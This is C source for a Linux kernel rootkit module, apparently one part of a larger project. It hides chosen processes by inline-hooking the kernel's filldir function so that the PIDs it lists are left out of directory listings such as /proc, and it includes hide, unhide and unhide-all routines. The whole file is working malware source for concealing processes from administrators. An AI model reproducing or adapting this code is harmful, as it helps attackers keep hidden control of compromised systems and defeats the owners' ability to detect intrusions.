#include "process_hiding.h"
#include "../symbol.h"
#include "../hook_inline.h"
#include "../log.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>

static struct {
    const char *name[10];
    size_t max;
} hidden_procs = {
    .name[0 ... 9] = NULL,
    .max = 10,
};

static struct in_hook filldir_inline_hook;

void process_hide(const char *pid)
{
    int i;
    for (i = 0; i < hidden_procs.max; ++i) {
        if (hidden_procs.name[i] == NULL) {
            hidden_procs.name[i] = pid;
            return;
        }
    }
}

void process_unhide(const char *pid)
{
    int i;
    for (i = 0; i < hidden_procs.max; ++i) {
        if (hidden_procs.name[i] && !strcmp(hidden_procs.name[i], pid))
            hidden_procs.name[i] = NULL;
    }
}

void process_unhide_all(void)
{
    int i;
    for (i = 0; i < hidden_procs.max; ++i)
        hidden_procs.name[i] = NULL;
    inline_hook_disable(&filldir_inline_hook);
}

typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);

filldir_t orig_filldir;

int rootkit_filldir(void *buf, const char *name, int namelen, loff_t offset,
        u64 ino, unsigned int d_type)
{
    int i, ret;
    for (i = 0; i < hidden_procs.max; ++i) {
        if (hidden_procs.name[i] && !strcmp(hidden_procs.name[i], name)) {
            return 0;
        }
    }
    inline_hook_disable(&filldir_inline_hook);
    ret = orig_filldir(buf, name, namelen, offset, ino, d_type);
    inline_hook_enable(&filldir_inline_hook);
    return ret;
}

int process_hide_init(void)
{
    if ((*((unsigned long*)&orig_filldir) = symbol_retrieve("filldir")) == 0)
        return 1;

    inline_hook_init((unsigned long)orig_filldir,
            (unsigned long)rootkit_filldir, REL_JMP, &filldir_inline_hook);
    inline_hook_enable(&filldir_inline_hook);
    return 0;
}
